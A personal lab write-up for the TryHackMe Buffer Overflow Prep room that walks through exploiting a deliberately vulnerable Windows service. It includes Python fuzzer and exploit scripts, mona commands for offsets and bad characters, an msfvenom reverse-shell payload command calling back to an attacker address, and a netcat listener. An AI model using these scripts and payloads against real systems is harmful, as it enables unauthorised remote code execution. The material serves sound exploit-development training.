

# What is Buffer Overflow

Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to Another. A buffer overflow (or buffer overrun) occurs when the volume of data exceeds the storage capacity of The memory buffer. As a result, the program attempting to write the data to the buffer overwrites adjacent Memory locations, so an attacker can use this and overwrite buffer with malicious code.
Buffer overflows can affect all types of software. They typically result from malformed inputs or failure to allocate Enough space for the buffer. If the transaction overwrites executable code, it can cause the program to behave Unpredictably and generate incorrect results, memory access errors, or crashes
For example, a buffer for log-in credentials may be designed to expect username and password inputs of 8 bytes, So if a transaction involves an input of 10 bytes (that is, 2 bytes more than expected), the program may write the Excess data past the buffer boundary.
![[Pasted image 20221221154157.png]]

[Computerphile_BoF_Video](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=212s&ab_channel=Computerphile)

# How it works
What we need to do to execute code using bufferoverflow is to find a way to get control the  EIP value inside the Memory because EIP points to the next insutraction and if we can control the EIP we can tell the program to jmp To where ever we want which is in this case a malicious code 



# Spiking 
First stage of finding Buffer Overflow is Spiking to check if the app is vulnerable or not 
We will use generic_tcp_send tool to find it
**Spiking example taken from grey corner vulnserver** [vulnserver](https://thegreycorner.com/vulnserver.html)
![[Pasted image 20221221161431.png]]
First we write stats.spk and add inside
```
s_readline();
s_string("STATS "); # which line we are going to spike
s_string_variable("0") 
```
Basically what the script does is sending bunch of chars and see if the program is going to crash or not if it Crashed we have a bufferover flow 
```bash
generic_send_tcp 192.168.1.70 9999 stats.spk 0 0 # spike IP 192.168.1.70 at port 9999 using stats.spk
```
And we can now spike each line and see which line will crash the program 


# Fuzzing
Next step is Fuzzing
This will be a writeup for [Buffer Overflow Prep from TryHackMe](https://tryhackme.com/room/bufferoverflowprep) Room

after setting up our vpn and connecting with xfree rdp now we can start 
First we run immunity debugger as administrator and open our vulnerable app called oscp  inside

```
 C:\Users\admin\Desktop\vulnerable-apps\oscp
```

![[Pasted image 20221221160127.png]]
and run it 
![[Pasted image 20221221160144.png]]

Configure mona to make a directory to save data in 

```
!mona config -set workingfolder c:\mona\%p
```

![[Pasted image 20221221160710.png]]
get back to debugger
![[Pasted image 20221221160810.png]]

Now we get our fuzzing using the following script:
```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.44.100" # target IP

port = 1337 # target port 
timeout = 5
prefix = "OVERFLOW1 " # option command 

string = prefix + "A" * 100 # payload

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```
What this script does is it will send increasingly long strings comprised of As If the fuzzer crashes the server with One of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that Were sent.
```bash
python3 fuzzer.py
```
![[Pasted image 20221221163243.png]]

![[Pasted image 20221221163259.png]]

So it crashed at 2000 bytes and as u can see we overwrote the EIP with 41 41 41 41 which is the ascii code for the Letter A 

# Crash Replication & Controlling EIP
For the next step we need to find the offset and control the EIP 
Using this script

```python
import socket

ip = "10.10.44.100"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset 
retn = "" # Return address that we want to jmp to
padding = "" # padd before payload if we are encoding payload
payload = "" 
postfix = "" # if there is extra options 

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Because we want to find where does the program crashes to know when it reaches the EIP 
We need to use something else than bunch of As because using same letter we won't be able to find when did it Crash
For that we are using metasploit module pattern_create.rb 
This module will create different chars ( cyclic pattern ) and when the server crashes we will be able to see what Chars overwrote the EIP  
Keep in mind that we need to add more than 2000 chars because that we will need more space later for our Payload so we will add extra 400 

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```
Now we copy the output  and paste it inside payload variable in our previous code
![[Pasted image 20221221170255.png]]
Now we reopen immunity debugger and rerun our program 
```bbash
python3 exploit.py
```
![[Pasted image 20221221171910.png]]

Now we need to find what overwrote the EIP and we are going to use mona for to find cyclic pattern inside the memory  
```
!mona findmsp -distance 2400
```
![[Pasted image 20221221172405.png]]

EIP starts at offset 1978 and ESP points to 1982 it's 4 bytes later because EIP is 4 bytes  and the remaining strings  That ESP is point to are 418 which is enough for our payload 
Now we found our offset and add it to our exploit.py script

# Finding bad chars
Now therein the initial processing of the strings of the program when the program detects these bad characters It modifies buffer/end buffer early for example %00 ( Null Byte ) in c and c++ if string contains Null byte it's the Internal way of telling the code that this is the end of the string so if there is null byte inside our payload it won't Work and there are other characters that can possibly be bad chars 
Using the following script will generate all the possible characters from 01 to FF 
```python 
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
Output:
```
  \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

```
Add bad chars to the script and because EIP didn't get overwrite with As from our script we will add 4 Bs in retn Variable in our script and now we should overwrite the EIP with 4 Bs
  ![[Pasted image 20221221174029.png]]
Rerun our program and run exploit.py
  ![[Pasted image 20221221174343.png]]
Program crashed and we overwrote EIP with 42 42 42 42 which is B in ascii and now all our bad chars will be Loaded into ESP register because that was exactly looking after EIP ESP points to the bytes exactly after EIP
![[Pasted image 20221221174547.png]]
Right click ESP and follow in Dump 
Now what we can do is check if there is anything out of order inside the ESP dump 
![[Pasted image 20221221174925.png]]
As u can see there is 4 chars that are out of the order 
```
\x07 \x08 \x2E \x2F 
```
## bad chars aren't bad chars 
Because  bad chars causes issues and it can make other normal chars a bad char so what we can do if we want to Be more optimal is to remove the first bad char and then rerun the exploit 

## using mona to find bad chars

We can use mona to generate a bytearray and exclude the null byte 
The location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration Section of this writeup, then the location should be
```
C:\mona\oscp\bytearray.bin

!mona bytearray -b "\x00"
```
![[Pasted image 20221221175756.png]]
Now what we can do is compare everything that the ESP register is pointing at with the file content that we just Generated 

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>

!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30
```
![[Pasted image 20221221180018.png]]
But still we need to verify that the bad chars aren't effecting other chars so what are we going to do is remove 07 And re run the program and generate new bytearray.bin without 07, renive 07 also from our exploit.py script and See if anything changed

```
!mona bytearray -b "\x00\x07"
python3 exploit.py
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A8FA30
```
![[Pasted image 20221221181206.png]]
As u can see 08 is removed and not flagged as bad char that means that 07 was effecting 08 and making it a bad Char 

Our bad chars so far
```
	\x00 \x07 \x2E \x2F \A0 \A1 
```
Re do the processes and remove 2E and A0 from mona and script
```
!mona bytearray -b "\x00\x07\x2e\xa0"
python3 exploit.py
!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30
```
![[Pasted image 20221221181909.png]]
And it's done! unmodified as status result it means that the bytearray we generated matches exactly the bytes That the address points to which means there is no more bad chars A1 and 2F were effected by 2E and A0
Bad chars:
```
\x00\x07\x2E\xA0
```

# Finding jump point
That we know what bad chars are we need to find the jump point 

## Using mona 

``` 
!mona jmp -r esp -cpb "BAD_CHARS_HERE"
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```
![[Pasted image 20221221182639.png]]
![[Pasted image 20221221182857.png]]
Found 9 jump points so copying first one 
Jump:625011af
This value is in big endian  format so we need to write it in little endian  because it's a 32 bit bufferoverflow so we Just need to write it in reverse every two it will be
```
\xaf\x11\x50\x62 
```
And add it to retn variable in exploit.py

### Making sure jump point works before exploiting 
To make sure that everything going to work we can copy the jump address we got re run the app and jump to The address 
![[Pasted image 20221221183603.png]]
![[Pasted image 20221221183621.png]]
![[Pasted image 20221221183707.png]]
Right click the address and choose Toggle
When ever the EIP is loaded with this it's going to pause the program 
Run our exploit.py
![[Pasted image 20221221184407.png]]
And we can see that our program is paused because it hit the jump point 

# Generate payload

Using msfvenom we can generate a code 

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "BAD_CHARS" -f c

msfvenom -p windows/shell_reverse_tcp LHOST=10.8.42.86 LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\a0" -f c

-a # for x86 or x64
```

![[Pasted image 20221221184741.png]]
Copy the output and put it inside payload variable in exploit.py
![[Pasted image 20221221184909.png]]
Don't forget to add () 

# Prepend NOPs
Because there was bad chars Shikata_ga_nai encoder was used to generate the payload, so we  will need some Space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" `(\x90)` bytes:

```
padding = "\x90" * 16
```

And we are all set
Now we can start a listener, rerun our program once more and run exploit.py 
```bash
nc -lvnp 9001
# run program 
python3 exploit.py
```

![[Pasted image 20221221185514.png]]
Now we can redo the process for the rest of OVERFLOWs inside the server to answer the rest of the THM room 
Good luck!

# OVERFLOW 5

 BadChars=16,2f,f4,fd


# OVERFLOW 6
1034 offset
00 08 2c 2d ad bad chars


# OVERFLOW 7
offset 1306
bad chars= 
00 8c ae be  fb 

# OVERFLOW 8

1786 offset

badchars=
00 1d 2e c7 c8 ee ef

# OVERFLOW 9

1514 offset 
00 04 3e 3f e1 

# OVERFLOW 10

537 offset 
00 xa0 xad xbe xde xef